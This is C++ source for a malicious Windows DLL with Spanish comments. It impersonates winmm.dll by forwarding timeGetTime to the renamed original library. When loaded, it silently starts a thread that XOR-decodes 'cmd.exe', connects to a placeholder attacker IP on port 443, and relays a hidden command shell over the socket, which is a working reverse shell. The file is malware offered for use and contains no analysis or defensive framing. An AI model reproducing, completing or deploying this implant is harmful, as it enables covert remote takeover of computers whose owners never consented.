#include <winsock2.h>
#include <ws2tcpip.h>
#include <windows.h>
#include <tlhelp32.h>

#define ATTACKER_IP   "IP"
#define ATTACKER_PORT  443

static HMODULE hLegit = NULL;

void LoadLegitDLL() {
    hLegit = LoadLibraryA("winmm_original.dll");
}

// Exportar timeGetTime hacia la DLL legítima
extern "C" __declspec(dllexport) DWORD myTimeGetTime() __asm__("timeGetTime");
DWORD myTimeGetTime() {
    if (!hLegit) LoadLegitDLL();
    typedef DWORD (WINAPI *pTimeGetTime)();
    pTimeGetTime fn = (pTimeGetTime)GetProcAddress(hLegit, "timeGetTime");
    if (fn) return fn();
    return 0;
}

void XorDecrypt(unsigned char* data, int len,
                unsigned char* key,  int keylen) {
    for (int i = 0; i < len; i++) {
        data[i] ^= key[i % keylen];
    }
}

bool IsInSandbox() {
    return false;
}

DWORD WINAPI ShellThread(LPVOID param) {
    Sleep(2000);

    // Descifrar cmd.exe
    unsigned char enc_cmd[] = { 0xC9, 0xCF, 0xCC, 0xAA, 0xCB, 0xCB, 0xCB };
    unsigned char key[]     = { 0xAA };
    XorDecrypt(enc_cmd, 7, key, 1);
    enc_cmd[7] = '\0';

    // Setup red
    WSADATA wsa;
    WSAStartup(MAKEWORD(2,2), &wsa);

    SOCKET sock = WSASocketA(
        AF_INET, SOCK_STREAM, IPPROTO_TCP,
        NULL, 0, 0
    );

    struct sockaddr_in sa;
    sa.sin_family = AF_INET;
    sa.sin_port   = htons(ATTACKER_PORT);
    inet_pton(AF_INET, ATTACKER_IP, &sa.sin_addr);

    if (connect(sock, (struct sockaddr*)&sa, sizeof(sa)) == SOCKET_ERROR) {
        closesocket(sock);
        WSACleanup();
        return 1;
    }

    // Crear pipes
    SECURITY_ATTRIBUTES saPipe = {0};
    saPipe.nLength        = sizeof(SECURITY_ATTRIBUTES);
    saPipe.bInheritHandle = TRUE;

    HANDLE hReadOut, hWriteOut;
    HANDLE hReadIn,  hWriteIn;

    CreatePipe(&hReadOut, &hWriteOut, &saPipe, 0);
    CreatePipe(&hReadIn,  &hWriteIn,  &saPipe, 0);

    // No heredar estos handles
    SetHandleInformation(hReadOut,  HANDLE_FLAG_INHERIT, 0);
    SetHandleInformation(hWriteIn,  HANDLE_FLAG_INHERIT, 0);

    // Lanzar cmd.exe
    STARTUPINFOA si = {0};
    PROCESS_INFORMATION pi = {0};
    si.cb          = sizeof(si);
    si.dwFlags     = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;
    si.hStdInput   = hReadIn;
    si.hStdOutput  = hWriteOut;
    si.hStdError   = hWriteOut;

    char cmd[] = "cmd.exe";
    CreateProcessA(
        NULL, cmd,
        NULL, NULL, TRUE,
        CREATE_NO_WINDOW,
        NULL, NULL, &si, &pi
    );

    CloseHandle(hWriteOut);
    CloseHandle(hReadIn);

    char buf[4096];
    DWORD bytesRead, bytesWritten, available;

    while (true) {
        // cmd.exe → socket
        PeekNamedPipe(hReadOut, NULL, 0, NULL, &available, NULL);
        if (available > 0) {
            DWORD toRead = available > sizeof(buf) ? sizeof(buf) : available;
            if (!ReadFile(hReadOut, buf, toRead, &bytesRead, NULL)) break;
            if (send(sock, buf, bytesRead, 0) <= 0) break;
        }

        // socket → cmd.exe
        fd_set fds;
        FD_ZERO(&fds);
        FD_SET(sock, &fds);
        timeval tv = {0, 50000};

        if (select(0, &fds, NULL, NULL, &tv) > 0) {
            int received = recv(sock, buf, sizeof(buf) - 1, 0);
            if (received <= 0) break;
            if (!WriteFile(hWriteIn, buf, received, &bytesWritten, NULL)) break;
        }

        // Verificar si cmd.exe sigue vivo
        DWORD exitCode;
        GetExitCodeProcess(pi.hProcess, &exitCode);
        if (exitCode != STILL_ACTIVE) break;

        Sleep(10);
    }

    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);
    CloseHandle(hReadOut);
    CloseHandle(hWriteIn);
    closesocket(sock);
    WSACleanup();
    return 0;
}

BOOL APIENTRY DllMain(HMODULE hMod, DWORD reason, LPVOID reserved) {
    switch(reason) {
        case DLL_PROCESS_ATTACH:
            DisableThreadLibraryCalls(hMod);
            LoadLegitDLL();
            CreateThread(NULL, 0, ShellThread, NULL, 0, NULL);
            break;
        case DLL_PROCESS_DETACH:
            if (hLegit) FreeLibrary(hLegit);
            break;
    }
    return TRUE;
}
